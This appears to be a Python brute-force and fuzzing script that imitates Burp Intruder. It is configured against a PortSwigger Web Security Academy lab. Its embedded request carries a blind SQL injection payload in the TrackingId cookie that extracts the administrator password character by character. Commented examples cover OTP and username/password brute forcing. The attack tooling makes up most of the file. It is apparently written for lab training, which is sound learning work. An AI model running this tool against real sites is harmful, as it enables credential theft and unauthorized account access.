
# Create venv
# python -m venv /tmp/bf-env
# source /tmp/bf-env/bin/activate

# 2. Install all
# pip install "httpx[h2]"
# pip install "httpx[http2]"

# 3. Execute this script
# python [script].py

# 4. Exit and clear
# deactivate
# rm -rf /tmp/bf-env


import asyncio
import itertools
import re
import subprocess
import httpx
import tempfile

CONCURRENCY_LIMIT = 1
PRINT_OUTPUT_PREVIEW = False
SAVE_OUTPUT_TO_FILE = False

# RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
RAW_REQUEST = """
GET /filter?category=Pets HTTP/2
Host: 0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net/
Cookie: session=BlbXyDIAePEoXIqm1KbNNAx52HSo5rpk; TrackingId=IQ629qN4TF6IQ2Gn'+AND+(SELECT+SUBSTRING(password,§POS§,1)+FROM+users+WHERE+username='administrator')='§LETTER§
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
""".strip()

# --- PAYLOAD GENERATORS ---

def generate_otps(length=4):
    """Generate zero-padded numbers"""
    for i in range(10**length):
        yield f"{i:0{length}d}"

def generate_wordlist(file_path):
    """Read a wordlist line by line"""
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            yield line.strip()

import string
def generate_payloads():
    """
    Change this function depending on your needs.
    Returns something like this: {"§PLACEHOLDER§": "VALUE"}
    """

    # One-shot payload (no placeholders)
    # return [{}]

    for pos in range(1, 21):

        for l in string.ascii_lowercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for l in string.ascii_uppercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for n in range(10):
            yield {"§LETTER§": str(n), "§POS§": pos}

    # for n in range(2,30):
    #    yield {"§len§": n}
    
    # EXAMPLE 1: Single payload (4-digits OTP)
    #for otp in generate_otps(length=4):
    #    yield {"§CODE§": otp}

    # EXAMPLE 2: Multi-payload / Cluster Bomb (Username + Password)
    # usernames = ["admin", "carlos", "wiener"]
    # passwords = generate_wordlist("passwords.txt")
    # for user, pwd in itertools.product(usernames, passwords):
    #     yield {"§USER§": user, "§PASS§": pwd}

    # EXAMPLE 3: Pitchfork (Coupled values 1:1)
    # for user, pwd in zip(users_list, pass_list):
    #     yield {"§USER§": user, "§PASS§": pwd}

def check_victory (response):
    """Check if the response is a victory condition."""
    # return True
    return response.status_code == 200 and ("Welcome" in response.text)
    # return response.status_code == 302 # and "Location" in response.headers

# --- PARSER & ENGINE ---

def parse_raw_request(raw_text: str):
    """Build request (url, headers e body) from RAW string."""
    lines = raw_text.splitlines()
    method, path, _ = lines[0].strip().split()
    
    headers = {}
    body_lines = []
    is_body = False
    
    for line in lines[1:]:
        if line == "":
            is_body = True
            continue
        if is_body:
            body_lines.append(line)
        else:
            key, value = line.split(":", 1)
            if key.strip().lower() != "content-length":
                headers[key.strip()] = value.strip()
                
    host = headers.get("Host", "")
    url = f"https://{host}{path}"
    body = "\n".join(body_lines)
    
    return method, url, headers, body

def inject_payloads(raw_template: str, payload_dict: dict) -> str:
    """Sostituisce dinamicamente tutti i segnaposto presenti nel template."""
    result = raw_template
    for placeholder, value in payload_dict.items():
        result = result.replace(placeholder, str(value))
    return result

def open_in_editor_or_browser(content: str, open_file: bool = False):
    """Salva il contenuto in /tmp e lo apre con il gestore di sistema (xdg-open)."""
    # ext = ".html" if is_html else ".txt"
    # with tempfile.NamedTemporaryFile("w", delete=False, suffix=ext, prefix="repeater_res_") as f:
    with open('/tmp/brute.html', 'w') as f:
        f.write(content)
        temp_path = f.name

    print(f"\n[+] Saved response in: {temp_path}")

    if open_file:
        # xdg-open for default app
        try:
            subprocess.Popen(["xdg-open", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"[-] Impossibile aprire xdg-open: {e}")

async def test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event):
    if stop_event.is_set():
        return

    async with semaphore:
        # Dynamic body replace
        body = inject_payloads(body_template, payload_dict)
        
        # Dynamic headers replace (ex. Cookie or X-Forwarded-For)
        req_headers = {
            k: inject_payloads(v, payload_dict) for k, v in headers.items()
        }

        try:
            response = await client.request(
                method=method,
                url=url,
                headers=req_headers,
                content=body,
                follow_redirects=False # IMPORTANT if you need to check the return code 302
            )

            # Victory condition
            if check_victory(response):
                stop_event.set()
                print(f"\n[+] Valid response (HTTP {response.status_code})!")
                print(f"[+] Valid payload: {payload_dict}")
                print(f"[+] Header Location: {response.headers.get('Location')}")
                print(f"[+] Set-Cookie: {response.headers.get('Set-Cookie')}")

                print(f"\n{"="*20} RESPONSE {"="*20}")
                print(f"HTTP/{response.http_version} {response.status_code} {response.reason_phrase}")
                for k, v in response.headers.items():
                    print(f"{k}: {v}")
                

                if PRINT_OUTPUT_PREVIEW:
                    print("\n" + response.text[:100]) # Anteprima terminale (primi 1000 char)
                    if len(response.text) > 100:
                        print("\n[... Output troncato a terminale ...]")
                    print("="*59)

                if SAVE_OUTPUT_TO_FILE:
                    # Save and open the full response in a temporary file
                    full_output = f"HTTP/{response.http_version} {response.status_code} {response.reason_phrase}\n"
                    full_output += "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                    full_output += "\n\n" + response.text
                    open_in_editor_or_browser(full_output)
                
        except Exception as ex:
            print(ex)
            pass

async def main():
    method, url, headers, body_template = parse_raw_request(RAW_REQUEST)
    
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    stop_event = asyncio.Event()

    print(f"[*] Inizio fuzzer su {url}...")
    
    limits = httpx.Limits(max_connections=CONCURRENCY_LIMIT, max_keepalive_connections=CONCURRENCY_LIMIT)
    async with httpx.AsyncClient(http2=True, limits=limits, verify=False) as client:
        tasks = []
        
        for payload_dict in generate_payloads():
            tasks.append(
                test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event)
            )
            
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())